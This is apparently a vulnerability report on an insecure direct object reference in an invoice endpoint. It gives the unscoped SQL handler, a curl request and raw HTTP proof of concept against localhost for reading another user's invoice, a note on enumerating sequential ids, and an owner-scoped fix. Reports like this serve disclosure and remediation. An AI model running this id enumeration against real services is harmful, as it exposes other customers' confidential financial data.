# IDOR in invoice detail exposes other users' invoices

## Summary

`GET /invoices/:id` looks up an invoice by the id in the URL and never checks who owns it. Any logged-in user can read anyone else's invoice by changing the number. No injection, no tooling — you just count.

## Vulnerability details

- **Type / CWE:** Broken access control / IDOR (CWE-639).
- **Severity:** Medium. `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5. Confidentiality only; it reads, it doesn't write.
- **Affected endpoint:** `GET /invoices/:id`, path parameter `id`.
- **Authentication:** any logged-in user. The caller is identified by `x-user-id` here (a stand-in for a session/JWT subject).

## Description

The handler fetches the row by path id and returns it:

```ts
const id = Number(req.params.id);
const row = db.prepare('SELECT id, description, amount, note FROM invoices WHERE id = ?').get(id);
```

There's no second predicate tying the row to the caller. The app clearly has an owner model — every invoice has an `owner_id` — but this query doesn't use it. So the authorization that everyone assumes is happening ("you only see your own invoices") exists only in the UI, not in the data access. Change the id, get someone else's row.

## Steps to reproduce

1. Authenticate as alice (`owner_id` 1). Invoices 1 and 2 are hers; invoice 3 belongs to bob (`owner_id` 2).
2. Request bob's invoice while identifying as alice:
   ```bash
   curl 'http://localhost:3000/invoices/3' -H 'x-user-id: 1'
   ```
3. The response is bob's invoice, even though alice doesn't own it.

## Proof of concept

Request:
```
GET /invoices/3 HTTP/1.1
Host: localhost:3000
x-user-id: 1
```

Response:
```json
{ "id": 3, "description": "Pentest engagement", "amount": 3200, "note": "" }
```

Invoice 3 is bob's (`owner_id` 2). Alice (`x-user-id` 1) reading it back is the whole bug. Walking the id from 1 upward enumerates every invoice in the system.

## Impact

Cross-tenant data exposure. Any account can read every other account's invoices — amounts, descriptions, notes — by iterating a small integer. Invoice ids are sequential, so a short loop dumps the entire table. For a billing product that's confidential financial data belonging to other customers, and a GDPR-reportable exposure for EU users. It also leaks business intelligence (who's paying whom, how much) that competitors would value.

## Remediation

Scope the query to the authenticated owner. A miss returns 404, so you don't even confirm the id exists:

```ts
const ownerId = Number(req.header('x-user-id'));
if (!Number.isInteger(ownerId)) return res.status(401).json({ error: 'auth required' });
db.prepare('SELECT id, description, amount, note FROM invoices WHERE id = ? AND owner_id = ?')
  .get(id, ownerId);
```

The ownership check belongs in the query (or a shared data-access layer), not in the client. Every by-id read on a tenant-owned resource needs the same predicate.

## References

- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP: Insecure Direct Object References / Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- OWASP Top 10: A01:2021 Broken Access Control
